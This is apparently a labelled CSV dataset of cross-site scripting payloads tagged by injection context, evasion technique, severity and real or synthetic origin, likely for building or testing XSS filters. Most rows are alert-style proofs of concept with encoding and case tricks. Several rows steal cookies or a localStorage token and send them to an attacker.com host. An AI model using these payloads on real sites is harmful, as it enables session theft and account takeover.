payload,context,technique,severity,length,source
<canvas onfocusout=alert(1) tabindex=1 id=x></canvas><input autofocus>,tag_injection,none,medium,70,real
<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>,tag_injection,none,medium,75,real
"<section onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,73,real
"<image onmouseenter=""alert(1)"">AnonKryptiQuz</image>",tag_injection,none,medium,52,real
"' onhashchange=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,55,synthetic
onp&#97;us&#101;=consol&#101;.log/***/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,61,synthetic
"' ><svg onpopst&#97;t&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,76,synthetic
"' ><svG oNbeForEmaTch=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
"(n&#101;w Function(""prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""))();",dom_sink,synthetic,medium,93,synthetic
"__proto__[""onscrollsn&#97;pch&#97;ng&#101;""]=f&#101;tch(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,low,113,synthetic
"<aside onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</aside>",tag_injection,none,medium,63,real
	onbegin=console.log(%27XSS%27),event_handler,synthetic,medium,31,synthetic
<script	>confirm('XSS')</script>,script_injection,synthetic,medium,32,synthetic
"<map onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</map>",tag_injection,none,medium,59,real
"<head draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</head>",tag_injection,none,medium,85,real
%22><set oncanplay=confirm(1)>,tag_injection,synthetic,medium,30,synthetic
"eval(""prompt('XSS')"")",dom_sink,synthetic,medium,21,synthetic
</a onmousemove=alert(1)>,event_handler,none,medium,25,real
"<img oncontextmenu=""alert(1)"">AnonKryptiQuz</img>",tag_injection,none,medium,49,real
"""><img src=x onwheel=prompt(location.hash)>",attribute_escape,synthetic,medium,43,synthetic
<imAge	onEnd=prOmpT(1)>,tag_injection,synthetic,medium,23,synthetic
<body onpointerdown=alert(1) style=display:block>AnonKryptiQuz</body>,tag_injection,none,medium,69,real
'><img src=x onanimationiteration=console.log(document.domain)>,attribute_escape,synthetic,medium,63,synthetic
<area onclose=prompt(1)/>,tag_injection,synthetic,medium,25,synthetic
'><img src=x onbeforematch=confirm(1)>,attribute_escape,synthetic,medium,38,synthetic
"document.write(""%3Cimg src=x onerror=fetch('XSS')%3E"")",dom_sink,synthetic,high,54,synthetic
<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>AnonKryptiQuz</style>,tag_injection,none,medium,100,real
"\"" onwaiting=prompt(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,52,synthetic
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>,tag_injection,none,medium,71,real
%22 ontouchstart=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,39,synthetic
<a onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<meta onmousemove=""alert(1)"">AnonKryptiQuz</meta>",tag_injection,none,medium,49,real
<div onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
%3Cimage/onchange=alert(1)%3E,tag_injection,synthetic,medium,29,synthetic
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",tag_injection,none,medium,107,real
' %3E%3Csvg onwheel=console.log(document.domain)%3E,attribute_escape,synthetic,medium,51,synthetic
'><img src=x onmous&#101;down=confirm(1)>,attribute_escape,synthetic,medium,41,synthetic
%3Cmath onscrollend=prompt(document.domain) onscrollend=prompt(document.domain)%3E,tag_injection,synthetic,medium,82,synthetic
\' OnpAgeRevEal=coNsoLe.Log(1)//,attribute_escape,synthetic,medium,32,synthetic
<diAloG	oNstAllEd=ConFirM('XSS')>,tag_injection,synthetic,medium,33,synthetic
`><Img srC=x onMouSedOwn=alErt(loCatIon.haSh)>,attribute_escape,synthetic,medium,46,synthetic
"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",tag_injection,none,medium,158,real
%22><img src=x onmouseenter=alert(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>,script_injection,none,medium,66,real
%27 ><svg onselect=console.log(location.hash)>,attribute_escape,synthetic,medium,46,synthetic
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",js_uri,none,medium,92,real
<animatemotion onpointermove=alert(1) style=display:block>AnonKryptiQuz</animatemotion>,tag_injection,none,medium,87,real
"javascr	ipt:prompt/***/(String.fromCharCode(88,83,83))",js_uri,synthetic,high,54,synthetic
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",tag_injection,none,medium,107,real
' oNtoUchMovE=cOnsOle.loG('XSS') ',attribute_escape,synthetic,medium,34,synthetic
&quOt; onWheEl=ProMpt('XSS') x=&qUot;,attribute_escape,synthetic,medium,37,synthetic
""" ><svg onpointerup=prompt(location.hash)>",attribute_escape,synthetic,medium,42,synthetic
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,tag_injection,none,medium,55,real
"?javascript:alert(1)"",",js_uri,none,medium,22,real
<meta ondrop=alert(document.domain) ondrop=alert(document.domain)>,tag_injection,synthetic,medium,66,synthetic
"%3Cscript
%3Econfirm(1)%3C/script%3E",script_injection,synthetic,medium,36,synthetic
OnkEyuP=cOnfIrm(loCatIon.haSh),event_handler,synthetic,medium,30,synthetic
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></image>",tag_injection,none,medium,114,real
<xss src=x onmouseover=console.log(%27XSS%27)>,tag_injection,synthetic,medium,46,synthetic
""" onpointerdown=\u0061lert(document.domain) """,attribute_escape,synthetic,low,45,synthetic
<svg><label onload=alert(1)></label>,tag_injection,none,medium,36,real
&quot; ong&#101;stur&#101;&#101;nd=confirm(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,medium,74,synthetic
"location=""javascript:\u0061lert(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,71,synthetic
""" onblur=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,low,48,synthetic
""" ><svg onpoint&#101;rov&#101;r=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,63,synthetic
%3Cblink onkeypress=prompt(document.domain) onkeypress=prompt(document.domain)%3E,tag_injection,synthetic,medium,81,synthetic
'><img src=x onpagereveal=confirm(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=fEtcH(lOcaTioN.hAsh)>"")",dom_sink,synthetic,high,82,synthetic
""" %3E%3Csvg onpromptdismiss=prompt(document.domain)%3E",attribute_escape,synthetic,medium,54,synthetic
<svg><content onload=alert(1)></content>,tag_injection,none,medium,40,real
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></option>",tag_injection,none,medium,116,real
"<blink onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></blink>",tag_injection,none,medium,283,real
&quOt; onWebKitFulLscReeNchAngE=aLerT('XSS') X=&QuoT;,attribute_escape,synthetic,medium,53,synthetic
"<div draggable=""true"" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>",tag_injection,none,medium,111,real
%3Cscript	%3Eprompt(location.hash)%3C/script%3E,script_injection,synthetic,medium,47,synthetic
"<blink onmouseleave=""alert(1)"">AnonKryptiQuz</blink>",tag_injection,none,medium,52,real
"<link onmouseout=""alert(1)"">AnonKryptiQuz</link>",tag_injection,none,medium,48,real
%27><img src=x ontouchstart=prompt(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
"Obj&#101;ct.&#97;ssign(window,{""oncopy"":&#97;l&#101;rt})",dom_sink,synthetic,low,56,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=&#97;l&#101;rt('XSS')>"")",dom_sink,synthetic,low,132,synthetic
"\"" onpromptdismiss=alert(document.domain)//",attribute_escape,synthetic,medium,43,synthetic
"<strong onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</strong>",tag_injection,none,medium,65,real
"<textarea onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",tag_injection,none,medium,77,real
alert(1);,generic,none,medium,9,real
"<output oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
 onAniMatIonEnd=coNsoLe.Log(loCatIon.haSh),event_handler,synthetic,medium,42,synthetic
"' ><svG oNpoIntErmOve=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
"<main draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</main>",tag_injection,none,medium,61,real
" onPagEreVeaL=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,52,synthetic
javaSCRIPT&colon;confirm(1),generic,none,medium,27,real
onpopstate=confirm('XSS'),event_handler,synthetic,medium,25,synthetic
<!--><plaintext ontouchstart=\u0061lert(1)>,tag_injection,synthetic,low,43,synthetic
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,59,real
<x oncopy=alert(1)>copy this!,tag_injection,none,medium,29,real
\%27 onvolumechange=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,40,synthetic
<!--><&#97; onk&#101;ypr&#101;ss=confirm(1)>,tag_injection,synthetic,medium,44,synthetic
""" ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,65,synthetic
""" %3E%3Csvg oncut=alert('XSS')%3E",attribute_escape,synthetic,medium,33,synthetic
<legend onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<strike contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
"<IFRAME SRC=""javascript:alert(8401);""></IFRAME>",js_uri,case_variation,medium,47,real
"window[%22prompt%22](navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink,synthetic,high,80,synthetic
""" ><svg onvolumechange=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>,tag_injection,none,medium,74,real
"""><Div onWebKitFulLscReeNchAngE=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,70,synthetic
"java	scr	ipt:console.log(String.fromCharCode(88,83,83))",js_uri,synthetic,high,55,synthetic
"%3Ctemplate
ondragenter=alert('XSS')%3E",tag_injection,synthetic,medium,39,synthetic
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onwebkitanimationend=""alert(1)""></textarea>",tag_injection,none,medium,107,real
%3Canimate onwebkitfullscreenchange=console.log(1) onwebkitfullscreenchange=console.log(1)%3E,tag_injection,synthetic,medium,93,synthetic
%27 ><svg onwebkitfullscreenchange=alert(%27XSS%27)>,attribute_escape,synthetic,medium,52,synthetic
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",script_injection,none,low,62,real
eval(%22console.log(document.domain)%22),dom_sink,synthetic,medium,40,synthetic
""" oNclIck=coNfiRm('XSS') """,attribute_escape,synthetic,medium,26,synthetic
"<noembed onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,75,real
"__proto__[""onlo&#97;d""]=XMLHttpR&#101;qu&#101;st(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink,synthetic,high,107,synthetic
<form onpagehide=confirm(1) onpagehide=confirm(1)>,tag_injection,synthetic,medium,50,synthetic
""" ><svg onfullscreenchange=\u0061lert(location.hash)>",attribute_escape,synthetic,low,53,synthetic
&#106;avascript:alert(1),js_uri,synthetic,medium,24,synthetic
\' onw&#97;iting=confirm(docum&#101;nt.dom&#97;in)//,attribute_escape,synthetic,medium,52,synthetic
"%22><img src=x onhashchange=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
"""><SelEct onVolUmeChaNge=coNsoLe.Log(1)>",tag_injection,synthetic,medium,40,synthetic
\' on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape,synthetic,medium,50,synthetic
"\"" ongotpointercapture=alert(1)//",attribute_escape,synthetic,medium,33,synthetic
"&quot; onbeforetoggle=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,67,synthetic
"<shadow draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",tag_injection,none,medium,90,real
OnsCroLleNd=JavAscRipT:cOnfIrm(1),event_handler,synthetic,medium,33,synthetic
OnkEydOwn=coNsoLe.Log/***/(DocUmeNt.DomAin),event_handler,synthetic,low,43,synthetic
onfocusout=prompt&#40;%27XSS%27&#41;,event_handler,synthetic,low,36,synthetic
'><img src=x onvolumechange=alert(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
`><img src=x oncopy=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,39,synthetic
\%22 onpause=console.log(document.domain)//,attribute_escape,synthetic,medium,43,synthetic
<base/onpointerup=\u0061lert(location.hash)>,tag_injection,synthetic,low,44,synthetic
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",generic,html_entity|encoding,high,72,real
<menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>,tag_injection,none,medium,57,real
"%3Cdiv/onpause=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,55,synthetic
	ondragover=confirm(%27XSS%27),event_handler,synthetic,medium,30,synthetic
<svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>,tag_injection,url_encoding,low,45,real
<svg><script>123<1>alert(123)</script>,script_injection,none,medium,38,real
"<source onvolumechange=confirm(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,high,63,synthetic
\' onbeforepaste=\u0061lert('XSS')//,attribute_escape,synthetic,low,36,synthetic
onwebkitanimationend=javascr	ipt:alert(1),event_handler,synthetic,medium,41,synthetic
"OndBlcLicK=pRomPt&#40;StRinG.fRomChaRCoDe(88,83,83)&#41;",event_handler,synthetic,high,56,synthetic
#coNfiRm(DocUmeNt.DomAin),template_injection,synthetic,medium,25,synthetic
' onselect=prompt(1) ',attribute_escape,synthetic,medium,22,synthetic
__proto__[%22onfullscreenchange%22]=fetch(btoa(document.cookie)),dom_sink,synthetic,high,64,synthetic
 onMozFulLscReeNchAngE=pRomPt(1),event_handler,synthetic,medium,32,synthetic
"element.setAttribute(""onclick"",""confirm(document.cookie)"")",dom_sink,synthetic,high,58,synthetic
"eval(""eval(navigator.sendBeacon('//attacker.com',document.cookie))"")",dom_sink,synthetic,high,68,synthetic
"SetTimEouT(""FetCh(DocUmeNt.DomAin)"",0)",dom_sink,synthetic,high,38,synthetic
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)>""",dom_sink,synthetic,high,146,synthetic
' onended=prompt('XSS') ',attribute_escape,synthetic,medium,25,synthetic
"\"" OngOtpOinTerCapTurE=pRomPt(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,62,synthetic
"<style>:target {transform: rotate(180deg);}</style><listing id=x style=""transition:transform 2s"" ontransitionrun=print()></listing>",tag_injection,none,low,131,real
"'><img src=x ontouchend=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
""" %3E%3Csvg onend=console.log('XSS')%3E",attribute_escape,synthetic,medium,39,synthetic
"%22><img src=x oncut=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
<td	onk&#101;yup=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,51,synthetic
"<mt&#101;xt
on&#101;nd&#101;d=confirm(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,64,synthetic
"""%3E%3Cscript%3Ealert('XSS')%3C/script%3E",script_injection,synthetic,medium,41,synthetic
<address onpointerleave=alert(1) style=display:block>AnonKryptiQuz</address>,tag_injection,none,medium,76,real
""" ><svg ontr&#97;nsitionrun=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,85,synthetic
<audio onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<menuitem oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,102,real
"<i onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</i>",tag_injection,none,medium,57,real
"document.body.innerHTML=""<img src=x onerror=console.log(document.cookie)>""",dom_sink,synthetic,high,74,synthetic
<tr onanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
\' onsearch=alert(1)//,attribute_escape,synthetic,medium,22,synthetic
location.href=%22javascript:console.log(localStorage.getItem(%27token%27))%22,dom_sink,synthetic,high,77,synthetic
"""><img src=x onpointerrawupdate=\u0061lert('XSS')>",attribute_escape,synthetic,low,50,synthetic
<teMplAte/onCloSe=ConSolE.lOg(1)>,tag_injection,synthetic,medium,33,synthetic
' ><svG oNblUr=AleRt(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,36,synthetic
" oncont&#101;xtm&#101;nu=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,71,synthetic
"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<template/ondragenter=\u0061lert('XSS')>,tag_injection,synthetic,low,40,synthetic
<xsS sRc=X oNtoGglE=cOnsOle.loG('XSS')>,tag_injection,synthetic,medium,39,synthetic
"<bdi onmouseleave=""alert(1)"">AnonKryptiQuz</bdi>",tag_injection,none,medium,48,real
<p id=x tabindex=1 onfocus=alert(1)></p>,tag_injection,none,medium,40,real
"""><Img srC=x onBluR=aLerT(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,41,synthetic
onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log/**/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,76,synthetic
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt,event_handler,html_entity|url_encoding,low,58,real
`><img src=x onscrollsn&#97;pch&#97;ng&#101;=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,75,synthetic
"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></legend>",tag_injection,none,medium,172,real
